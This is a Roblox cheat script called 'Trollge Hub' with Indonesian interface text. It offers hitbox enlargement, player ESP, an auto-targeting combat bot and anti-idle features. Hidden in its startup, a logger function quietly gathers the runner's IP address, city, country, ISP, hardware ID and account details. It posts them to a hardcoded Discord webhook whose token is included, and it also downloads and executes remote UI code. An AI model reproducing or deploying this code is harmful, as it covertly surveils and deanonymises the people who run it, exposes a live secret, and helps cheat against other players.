local WEBHOOK_URL = "https://discord.com/api/webhooks/1516421004291997718/t5nSkmWsiwWFpSNHjJQv3fdQKWGm2SqOQag3LS3kSEwHL1QkuyfbgzFpLI7kDXO357Bj"

if getgenv().TrollgeHubLoaded then
    return game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Trollge Hub",
        Text = "Sistem sudah beroperasi di memori!"
    })
end
getgenv().TrollgeHubLoaded = true

local Services = setmetatable({}, {
    __index = function(t, k)
        local s = game:GetService(k)
        t[k] = s; return s
    end
})

local Players = Services.Players
local LocalPlayer = Players.LocalPlayer
local RunService = Services.RunService
local Workspace = Services.Workspace
local GuiService = Services.GuiService
local TeleportService = Services.TeleportService

local function SetupAutoReconnect()
    GuiService.ErrorMessageChanged:Connect(function()
        task.wait(1)
        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
    end)
    local virtualUser = game:GetService("VirtualUser")
    LocalPlayer.Idled:Connect(function()
        virtualUser:CaptureController()
        virtualUser:ClickButton2(Vector2.new())
    end)
end

local function SendGameLog()
    if not WEBHOOK_URL or WEBHOOK_URL == "" or string.find(WEBHOOK_URL, "MASUKKAN") then return end
    task.spawn(function()
        task.wait(3)
        local HttpService = game:GetService("HttpService")
        local Stats = game:GetService("Stats")
        local Market = game:GetService("MarketplaceService")
        local UserInputService = game:GetService("UserInputService")
        local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
        if not request then return end

        local UserId = LocalPlayer.UserId
        local DisplayName = LocalPlayer.DisplayName
        local Username = LocalPlayer.Name
        local AccountAge = LocalPlayer.AccountAge
        local Membership = LocalPlayer.MembershipType.Name
        local PlaceId = game.PlaceId
        local JobId = game.JobId

        local HWID = "Unknown"
        pcall(function() if gethwid then HWID = gethwid() elseif identifying then HWID = identifying() end end)

        local GameStatsText = "No Leaderstats Found"
        local LS = LocalPlayer:FindFirstChild("leaderstats")
        if LS then
            local TempStats = {}
            for _, v in pairs(LS:GetChildren()) do
                if v:IsA("IntValue") or v:IsA("NumberValue") or v:IsA("StringValue") then
                    table.insert(TempStats, "> **" .. v.Name .. ":** `" .. tostring(v.Value) .. "`")
                end
            end
            if #TempStats > 0 then GameStatsText = table.concat(TempStats, "\n") end
        end

        local AvatarURL = "https://i.imgur.com/C5uYqFk.png"
        pcall(function()
            local ApiUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..UserId.."&size=420x420&format=Png&isCircular=false"
            local Data = HttpService:JSONDecode(game:HttpGet(ApiUrl))
            if Data.data and Data.data[1] then AvatarURL = Data.data[1].imageUrl end
        end)

        local Executor = (identifyexecutor and identifyexecutor()) or "Unknown Executor"
        local IP_Data = { query = "Hidden", country = "Unknown", city = "Unknown", isp = "Unknown" }
        pcall(function() IP_Data = HttpService:JSONDecode(game:HttpGet("https://ip-api.com/json")) end)
        local Platform = UserInputService.TouchEnabled and not UserInputService.MouseEnabled and "Mobile" or "PC"
        local Ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
        local FPS = math.floor(workspace:GetRealPhysicsFPS())
        local GameName = "Unknown"
        pcall(function() GameName = Market:GetProductInfo(PlaceId).Name end)
        local EmbedColor = (Membership == "Premium") and 16766720 or 65280
        local JoinScript = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", tostring(PlaceId), JobId)
        local ProfileLink = "https://www.roblox.com/users/" .. UserId .. "/profile"

        local Data = {
            ["username"] = "Trollge Hub Logger",
            ["avatar_url"] = AvatarURL,
            ["content"] = "",
            ["embeds"] = {{
                ["title"] = "👑 " .. GameName .. " | LOG REPORT",
                ["url"] = ProfileLink,
                ["color"] = EmbedColor,
                ["thumbnail"] = { ["url"] = AvatarURL },
                ["fields"] = {
                    { ["name"] = "👤 **USER INFORMATION**", ["value"] = string.format("> **Display:** `%s`\n> **User:** [%s](%s)\n> **ID:** `%s`\n> **Age:** %d Days", DisplayName, Username, ProfileLink, UserId, AccountAge), ["inline"] = true },
                    { ["name"] = "🛡️ **HARDWARE ID (HWID)**", ["value"] = "```" .. HWID .. "```", ["inline"] = true },
                    { ["name"] = "💰 **IN-GAME STATS**", ["value"] = GameStatsText, ["inline"] = false },
                    { ["name"] = "📡 **NETWORK & DEVICE**", ["value"] = string.format("> **IP:** ||`%s`||\n> **Loc:** %s, %s\n> **Exe:** `%s` (%s)\n> **Ping:** `%dms` | **FPS:** `%d`", IP_Data.query, IP_Data.city, IP_Data.country, Executor, Platform, Ping, FPS), ["inline"] = false },
                    { ["name"] = "🔓 **QUICK JOIN**", ["value"] = "```lua\n" .. JoinScript .. "```", ["inline"] = false }
                },
                ["footer"] = { ["text"] = "Trollge Hub Logger • ISP: " .. IP_Data.isp, ["icon_url"] = AvatarURL },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }
        request({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(Data) })
    end)
end

--================================================
-- CORE MODULE: TROLLGE HUB LOGIC
--================================================
local Config = {
    HitboxV1Enabled = false, HitboxV1Size = 5,
    HitboxV2Enabled = false, HitboxV2NPC = false,
    HitboxV2Size = 20, HitboxV2Transparency = 0.9,
    CombotBot = false, UseAbilities = true,
    CombatRadius = 500, AttackDistance = 12,
    SmartSpeed = false, ESPEnabled = false, ESPNPC = false
}

local VirtualInputManager = game:GetService("VirtualInputManager")
local UserInputService = game:GetService("UserInputService")

local SpecialPlayers = {
    ["2297799641"] = "Reporter", ["4564878898"] = "Reporter",
    ["7566829904"] = "Script Creator"
}

-- Hitbox V1
local HitboxArray = {}
local function ApplyHitboxV1()
    local char = LocalPlayer.Character
    if not char or not char.Parent then return end
    for _, tool in pairs(char:GetChildren()) do
        if tool:IsA("Tool") then
            local hitbox = tool:FindFirstChild("Hitbox", true)
            if hitbox and hitbox:IsA("BasePart") then
                if not HitboxArray[hitbox] then HitboxArray[hitbox] = true end
                hitbox.Size = Vector3.new(Config.HitboxV1Size, Config.HitboxV1Size, Config.HitboxV1Size)
                hitbox.Transparency = 0.9
                hitbox.CanCollide = false
            end
        end
    end
end

local function SetHitboxV1(enabled)
    Config.HitboxV1Enabled = enabled
    if enabled then ApplyHitboxV1() end
end

local function SetHitboxV1Size(size)
    Config.HitboxV1Size = size
    if Config.HitboxV1Enabled then ApplyHitboxV1() end
end

-- Hitbox V2
local function SetHitboxV2(enabled) Config.HitboxV2Enabled = enabled end
local function SetHitboxV2Size(size) Config.HitboxV2Size = size end
local function SetHitboxV2Transparency(t) Config.HitboxV2Transparency = t / 100 end
local function SetHitboxV2NPC(enabled) Config.HitboxV2NPC = enabled end

-- CombotBot
local BodyGyro = Instance.new("BodyGyro")
BodyGyro.MaxTorque = Vector3.new(1, 1, 1) * 500000
BodyGyro.P = 100000
BodyGyro.D = 1000
local CombotBotActive = false

local function UseAbility(key)
    if Config.UseAbilities and CombotBotActive then
        VirtualInputManager:SendKeyEvent(true, key, false, game)
        task.wait(0.1)
        VirtualInputManager:SendKeyEvent(false, key, false, game)
    end
end

local function FindNearestTarget()
    local char = LocalPlayer.Character
    if not char then return nil end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return nil end

    local nearest = nil
    local shortest = Config.CombatRadius
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character then
            local targetRoot = player.Character:FindFirstChild("HumanoidRootPart")
            local targetHum = player.Character:FindFirstChildOfClass("Humanoid")
            if targetRoot and targetHum and targetHum.Health > 0 then
                local dist = (targetRoot.Position - root.Position).Magnitude
                if dist < shortest then shortest = dist; nearest = targetRoot end
            end
        end
    end
    return nearest
end

local function SetCombatBot(enabled)
    CombotBotActive = enabled
    Config.CombotBot = enabled
    if enabled then
        local char = LocalPlayer.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        if root then BodyGyro.Parent = root end
        task.spawn(function()
            while CombotBotActive do
                local char = LocalPlayer.Character
                local root = char and char:FindFirstChild("HumanoidRootPart")
                local hum = char and char:FindFirstChildOfClass("Humanoid")
                if char and root and hum and hum.Health > 0 then
                    local target = FindNearestTarget()
                    if target then
                        BodyGyro.CFrame = CFrame.lookAt(root.Position, target.Position)
                        local dist = (target.Position - root.Position).Magnitude
                        if dist > Config.AttackDistance then
                            hum:MoveTo(target.Position)
                        else
                            hum:Move(Vector3.new(0, 0, 0))
                            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.ButtonB, false, game)
                            task.wait(0.1)
                            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.ButtonB, false, game)
                            UseAbility(Enum.KeyCode.E)
                            UseAbility(Enum.KeyCode.Q)
                            UseAbility(Enum.KeyCode.R)
                        end
                    end
                end
                task.wait(0.1)
            end
            if BodyGyro.Parent then BodyGyro.Parent = nil end
            if hum then hum:Move(Vector3.new(0, 0, 0)) end
        end)
    else
        if BodyGyro.Parent then BodyGyro.Parent = nil end
    end
end

local function SetUseAbilities(enabled) Config.UseAbilities = enabled end
local function SetCombatRadius(radius) Config.CombatRadius = radius end
local function SetAttackDistance(distance) Config.AttackDistance = distance end

-- Smart Speed
local function SetSmartSpeed(enabled)
    Config.SmartSpeed = enabled
    if not enabled then
        local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum.WalkSpeed = 16 end
    end
end

-- ESP
local ESPObjects = {}
local function RemoveESP(userId)
    local espData = ESPObjects[userId]
    if espData then
        if espData.Highlight then pcall(function() espData.Highlight:Destroy() end) end
        if espData.Billboard then pcall(function() espData.Billboard:Destroy() end) end
        ESPObjects[userId] = nil
    end
end

local function CreateESP(player, character)
    if not Config.ESPEnabled then return end
    RemoveESP(player.UserId)
    local highlight = Instance.new("Highlight")
    highlight.Parent = character
    local billboard = Instance.new("BillboardGui")
    billboard.Parent = character
    billboard.Size = UDim2.new(0, 200, 0, 50)
    billboard.StudsOffset = Vector3.new(0, 3, 0)
    billboard.AlwaysOnTop = true
    local textLabel = Instance.new("TextLabel")
    textLabel.Parent = billboard
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.TextColor3 = Color3.new(1, 1, 1)
    textLabel.TextStrokeTransparency = 0
    textLabel.TextSize = 14
    local special = SpecialPlayers[tostring(player.UserId)]
    if special then
        highlight.FillColor = Color3.new(1, 0, 0)
        textLabel.Text = player.Name .. " [" .. special .. "]"
    else
        highlight.FillColor = Color3.new(0, 0, 0.5)
        textLabel.Text = player.Name
    end
    ESPObjects[player.UserId] = { Highlight = highlight, Billboard = billboard, Character = character }
end

local function SetESP(enabled)
    Config.ESPEnabled = enabled
    if not enabled then for userId, _ in pairs(ESPObjects) do RemoveESP(userId) end end
end

local function SetESPNPC(enabled) Config.ESPNPC = enabled end

-- ESP Loop
local ESPConnection
local function StartESPLoop()
    if ESPConnection then ESPConnection:Disconnect() end
    ESPConnection = RunService.RenderStepped:Connect(function()
        if Config.SmartSpeed then
            local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
            if hum then hum.WalkSpeed = 16 end
        end
        if Config.ESPEnabled then
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= LocalPlayer and player.Character then
                    local existing = ESPObjects[player.UserId]
                    if not existing or existing.Character ~= player.Character then
                        CreateESP(player, player.Character)
                    end
                end
            end
        end
    end)
end

-- Character Added
LocalPlayer.CharacterAdded:Connect(function(char)
    if Config.HitboxV1Enabled then task.wait(0.2); ApplyHitboxV1() end
end)

-- Cleanup
local function CleanupAll()
    SetCombatBot(false)
    SetESP(false)
    SetSmartSpeed(false)
    if ESPConnection then ESPConnection:Disconnect() end
    for userId, _ in pairs(ESPObjects) do RemoveESP(userId) end
    HitboxArray = {}
    ESPObjects = {}
end

--================================================
-- WIND UI
--================================================
local function InitInterface()
    local success, WindUI = pcall(function()
        return loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
    end)
    if not success or not WindUI then
        success, WindUI = pcall(function()
            return loadstring(game:HttpGet("https://tree-hub.vercel.app/api/UI/WindUI"))()
        end)
    end
    if not success or not WindUI then
        warn("WindUI gagal dimuat.")
        return
    end

    local Sounds = { StartupId = "rbxassetid://140397610798305", ClickId = "rbxassetid://140277245983305" }
    pcall(function() Services.ContentProvider:PreloadAsync({Sounds.StartupId, Sounds.ClickId}) end)
    function Sounds:Play(id, volume) task.spawn(function() local s = Instance.new("Sound"); s.SoundId = id; s.Volume = volume or 1; s.Parent = Services.SoundService; s.Ended:Connect(function() s:Destroy() end); s:Play() end) end
    function Sounds:Startup() self:Play(Sounds.StartupId, 1) end
    function Sounds:Click() self:Play(Sounds.ClickId, 0.8) end
    Sounds:Startup()

    WindUI:Notify({
        Title = "Trollge Hub",
        Content = "Script berhasil dijalankan!",
        Duration = 5,
        Icon = "skull"
    })

    local ViewportSize = Workspace.CurrentCamera.ViewportSize
    local isMobile = ViewportSize.X < 850
    local dynamicSize = isMobile and UDim2.fromOffset(ViewportSize.X * 0.85, ViewportSize.Y * 0.85) or UDim2.fromOffset(600, 420)
    local dynamicSideBar = isMobile and 150 or 200

    local Window = WindUI:CreateWindow({
        Title = "TROLLGE HUB",
        Icon = "lucide:swords",
        Author = "CombatBot_Tester",
        Folder = "TrollgeHub",
        Size = dynamicSize,
        Transparent = true,
        Theme = "Dark",
        Accent = Color3.fromRGB(180, 40, 40),
        SideBarWidth = dynamicSideBar,
        HasOutline = true,
        Background = "rbxassetid://137490169052447",
        BackgroundImageTransparency = 0.75
    })

    Window:Tag({ Title = "VIP", Icon = "lucide:crown", Color = Color3.fromHex("#ffb300"), Radius = 6 })

    local TabHitbox = Window:Tab({ Title = "Hitbox", Icon = "lucide:box" })
    local TabCombat = Window:Tab({ Title = "Combat", Icon = "lucide:crosshair" })
    local TabESP = Window:Tab({ Title = "ESP", Icon = "lucide:eye" })
    local TabSettings = Window:Tab({ Title = "Settings", Icon = "lucide:settings" })

    TabHitbox:Section({ Title = "Hitbox V1 (Tool)" })
    TabHitbox:Toggle({
        Title = "Enable Hitbox V1",
        Desc = "Mengaktifkan hitbox pada tool",
        Default = false,
        Callback = function(v) Sounds:Click(); SetHitboxV1(v) end
    })
    TabHitbox:Slider({
        Title = "Hitbox V1 Size",
        Desc = "Ukuran hitbox V1 dalam studs",
        Step = 1,
        Value = { Min = 1, Max = 50, Default = 5 },
        Callback = function(v) SetHitboxV1Size(v) end
    })

    TabHitbox:Section({ Title = "Hitbox V2 (Players)" })
    TabHitbox:Toggle({
        Title = "Enable Hitbox V2",
        Desc = "Mengaktifkan hitbox pada player",
        Default = false,
        Callback = function(v) Sounds:Click(); SetHitboxV2(v) end
    })
    TabHitbox:Toggle({
        Title = "Apply To NPC",
        Desc = "Terapkan juga ke NPC",
        Default = false,
        Callback = function(v) Sounds:Click(); SetHitboxV2NPC(v) end
    })
    TabHitbox:Slider({
        Title = "Hitbox V2 Size",
        Desc = "Ukuran hitbox V2 dalam studs",
        Step = 1,
        Value = { Min = 1, Max = 100, Default = 20 },
        Callback = function(v) SetHitboxV2Size(v) end
    })
    TabHitbox:Slider({
        Title = "Hitbox Transparency",
        Desc = "Transparansi hitbox V2",
        Step = 1,
        Value = { Min = 0, Max = 100, Default = 90 },
        Callback = function(v) SetHitboxV2Transparency(v) end
    })

    TabCombat:Section({ Title = "CombotBot-Beta" })
    TabCombat:Toggle({
        Title = "Enable CombotBot-Beta",
        Desc = "Aktifkan bot combat otomatis",
        Default = false,
        Callback = function(v) Sounds:Click(); SetCombatBot(v) end
    })
    TabCombat:Toggle({
        Title = "Use Abilities (E,Q,R)",
        Desc = "Gunakan ability saat combat",
        Default = true,
        Callback = function(v) Sounds:Click(); SetUseAbilities(v) end
    })
    TabCombat:Slider({
        Title = "Target Radius",
        Desc = "Jarak deteksi target",
        Step = 10,
        Value = { Min = 10, Max = 500, Default = 500 },
        Callback = function(v) SetCombatRadius(v) end
    })
    TabCombat:Slider({
        Title = "Attack Distance",
        Desc = "Jarak serang",
        Step = 1,
        Value = { Min = 5, Max = 30, Default = 12 },
        Callback = function(v) SetAttackDistance(v) end
    })

    TabCombat:Section({ Title = "Smart Speed" })
    TabCombat:Toggle({
        Title = "Enable Smart Speed",
        Desc = "Aktifkan kecepatan pintar",
        Default = false,
        Callback = function(v) Sounds:Click(); SetSmartSpeed(v) end
    })

    TabESP:Section({ Title = "Player ESP" })
    TabESP:Toggle({
        Title = "Enable ESP",
        Desc = "Aktifkan ESP untuk player",
        Default = false,
        Callback = function(v) Sounds:Click(); SetESP(v) end
    })
    TabESP:Toggle({
        Title = "Show NPCs",
        Desc = "Tampilkan NPC",
        Default = false,
        Callback = function(v) Sounds:Click(); SetESPNPC(v) end
    })

    TabSettings:Section({ Title = "System" })
    TabSettings:Button({
        Title = "Unload Script",
        Variant = "Danger",
        Callback = function()
            Sounds:Click()
            WindUI:Popup({
                Title = "Konfirmasi Unload",
                Icon = "alert-triangle",
                Content = "Yakin ingin menutup semua fitur?",
                Buttons = {
                    { Title = "Batal", Callback = function() end, Variant = "Tertiary" },
                    { Title = "Lanjutkan", Icon = "check", Callback = function()
                        CleanupAll()
                        getgenv().TrollgeHubLoaded = false
                        WindUI:Destroy()
                    end, Variant = "Primary" }
                }
            })
        end
    })
end

--================================================
-- EKSEKUSI UTAMA
--================================================
SetupAutoReconnect()
SendGameLog()
StartESPLoop()
task.spawn(InitInterface)